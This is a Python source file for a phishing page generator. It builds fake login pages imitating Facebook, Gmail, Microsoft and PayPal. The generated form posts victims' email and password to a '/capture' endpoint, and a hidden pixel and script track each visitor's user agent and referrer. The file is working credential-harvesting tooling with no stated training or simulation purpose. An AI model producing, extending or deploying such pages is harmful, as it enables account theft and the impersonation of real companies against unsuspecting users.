import os
import json
import random
import re
from datetime import datetime

class PhishingGenerator:
    """Advanced phishing page generator with dynamic templates"""
    
    TEMPLATES = {
        'facebook': {
            'title': 'Facebook - Log In',
            'brand': 'facebook',
            'logo': '<h1 style="color:#1877f2; font-size:40px;">facebook</h1>',
            'fields': [
                {'name': 'email', 'type': 'text', 'placeholder': 'Email or Phone'},
                {'name': 'password', 'type': 'password', 'placeholder': 'Password'}
            ],
            'submit': 'Log In',
            'footer': 'Forgot password?',
            'style': 'background:#f0f2f5; font-family:Arial;',
            'container_style': 'background:white; padding:40px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:396px;'
        },
        'gmail': {
            'title': 'Gmail - Sign in',
            'brand': 'Gmail',
            'logo': '<h1 style="font-size:24px; font-weight:400;">Sign in</h1><p style="color:#5f6368;">to continue to Gmail</p>',
            'fields': [
                {'name': 'email', 'type': 'email', 'placeholder': 'Email'},
                {'name': 'password', 'type': 'password', 'placeholder': 'Password'}
            ],
            'submit': 'Next',
            'footer': '',
            'style': 'background:#fff; font-family:Roboto,Arial;',
            'container_style': 'background:white; padding:48px 40px 36px; border:1px solid #dadce0; border-radius:8px; width:368px;'
        },
        'microsoft': {
            'title': 'Sign in to your Microsoft account',
            'brand': 'Microsoft',
            'logo': '<h1 style="font-size:28px; font-weight:300;">Sign in</h1>',
            'fields': [
                {'name': 'email', 'type': 'email', 'placeholder': 'Email, phone, or Skype'},
                {'name': 'password', 'type': 'password', 'placeholder': 'Password'}
            ],
            'submit': 'Sign in',
            'footer': 'Forgot password?',
            'style': 'background:#f2f2f2; font-family:Segoe UI,Roboto;',
            'container_style': 'background:white; padding:44px; border-radius:2px; box-shadow:0 2px 6px rgba(0,0,0,0.15); width:440px;'
        },
        'paypal': {
            'title': 'Log in to your PayPal account',
            'brand': 'PayPal',
            'logo': '<h1 style="color:#003087; font-size:32px;">PayPal</h1>',
            'fields': [
                {'name': 'email', 'type': 'text', 'placeholder': 'Email'},
                {'name': 'password', 'type': 'password', 'placeholder': 'Password'}
            ],
            'submit': 'Log In',
            'footer': 'Trouble logging in?',
            'style': 'background:#e5e5e5; font-family:Arial;',
            'container_style': 'background:white; padding:40px; border-radius:4px; box-shadow:0 4px 12px rgba(0,0,0,0.1); width:380px;'
        }
    }
    
    @classmethod
    def generate_page(cls, platform, campaign_id, custom_message=None):
        """Generate dynamic phishing page with tracking"""
        tmpl = cls.TEMPLATES.get(platform, cls.TEMPLATES['facebook'])
        
        fields_html = ''.join([
            f'<input type="{f["type"]}" name="{f["name"]}" placeholder="{f["placeholder"]}" '
            f'style="width:100%; padding:12px 14px; border:1px solid #ddd; border-radius:4px; '
            f'margin-bottom:10px; font-size:16px; box-sizing:border-box;">'
            for f in tmpl['fields']
        ])
        
        # Tracking pixel
        tracking = f'<img src="/track/{campaign_id}" width="1" height="1" style="display:none;">'
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{tmpl['title']}</title>
    <style>
        body {{
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            margin:0;
            {tmpl['style']}
        }}
        .container {{
            {tmpl['container_style']}
            text-align:center;
        }}
        .container h1 {{ margin:0; }}
        .container p {{ margin:0; }}
        form {{ margin-top:20px; }}
        input {{ 
            width:100%; 
            padding:12px 14px; 
            border:1px solid #ddd; 
            border-radius:4px; 
            margin-bottom:10px; 
            font-size:16px; 
            box-sizing:border-box;
        }}
        button {{
            width:100%;
            padding:12px;
            background:#1877f2;
            color:white;
            border:none;
            border-radius:4px;
            font-size:18px;
            font-weight:bold;
            cursor:pointer;
            margin-top:8px;
        }}
        .footer {{
            margin-top:16px;
            font-size:14px;
            color:#666;
        }}
    </style>
</head>
<body>
    <div class="container">
        {tmpl['logo']}
        <form method="POST" action="/capture/{campaign_id}">
            {fields_html}
            <button type="submit">{tmpl['submit']}</button>
        </form>
        <div class="footer">{tmpl['footer']}</div>
    </div>
    {tracking}
    <script>
        // User-agent tracking
        document.addEventListener('DOMContentLoaded', function() {{
            fetch('/track/{campaign_id}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    userAgent: navigator.userAgent,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                }})
            }});
        }});
    </script>
</body>
</html>'''
        
        if custom_message:
            html = html.replace('</body>', f'<div style="margin-top:12px; color:#666; font-size:14px;">{custom_message}</div></body>')
        
        return html
